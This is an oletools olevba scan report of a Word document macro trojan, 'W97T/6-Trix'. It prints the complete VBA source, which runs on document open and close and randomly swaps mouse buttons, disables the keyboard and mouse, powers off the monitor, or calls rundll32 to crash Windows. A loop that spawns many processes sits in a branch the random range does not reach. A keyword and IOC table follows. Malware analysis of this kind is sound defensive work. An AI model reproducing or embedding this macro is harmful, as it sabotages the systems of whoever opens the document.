olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Trix
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Trix - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSWord.Trix - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W97T/6-Trix by Error and Hash from TN
'-----------simply for fun----------
'          Warning you now:
' This is a nasty but SIMPLE trojan
'-----------------------------------
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
    (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, _
    ByVal lParam As Long) As Long
    Private Const WM_SYSCOMMAND = &H112&
    Private Const SC_MONITORPOWER = &HF170&

Sub AutoOpen()
Call Nukeit
End Sub
Sub AutoClose()
Call Nukeit
End Sub
Function Nukeit()
Randomize Timer
x = Int(Rnd(1) * 5) + 1
If x = 1 Then
    'Are you Ambidexterous?
    Shell "rundll32 user,swapmousebutton"
End If
If x = 2 Then
    'Try typing without a keyboard...and a mouse
    Shell "rundll32 keyboard,disable"
    Shell "rundll32 mouse,disable"
End If
If x = 3 Then
    'WTF happened to my screen!!!
    Dim Ret As Long
    Ret = SendMessage(-1, WM_SYSCOMMAND, SC_MONITORPOWER, 0&)
End If
If x = 4 Then
    'Where did windows Go?!
    Shell "rundll32 krnl386.exe,exitkernel"
End If
If x = 5 Then
    'Blue screen of DEATH!!!
    Shell "rundll32 user,disableoemlayer"
End If
If x = 6 Then
    Do While z <> 1000
    'Overload windows!!
        s = Shell("notepad.exe", vbNormalFocus)
        s = Shell("ping.exe", vbNormalFocus)
        s = Shell("tracert.exe", vbNormalFocus)
        s = Shell("calc.exe", vbNormalFocus)
        s = Shell("charmap.exe", vbNormalFocus)
        s = Shell("pbrush.exe", vbNormalFocus)
        s = Shell("write.exe", vbNormalFocus)
        z = z + 1
    Loop
End If
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |krnl386.exe         |Executable file name                         |
|IOC       |notepad.exe         |Executable file name                         |
|IOC       |ping.exe            |Executable file name                         |
|IOC       |tracert.exe         |Executable file name                         |
|IOC       |calc.exe            |Executable file name                         |
|IOC       |charmap.exe         |Executable file name                         |
|IOC       |pbrush.exe          |Executable file name                         |
|IOC       |write.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

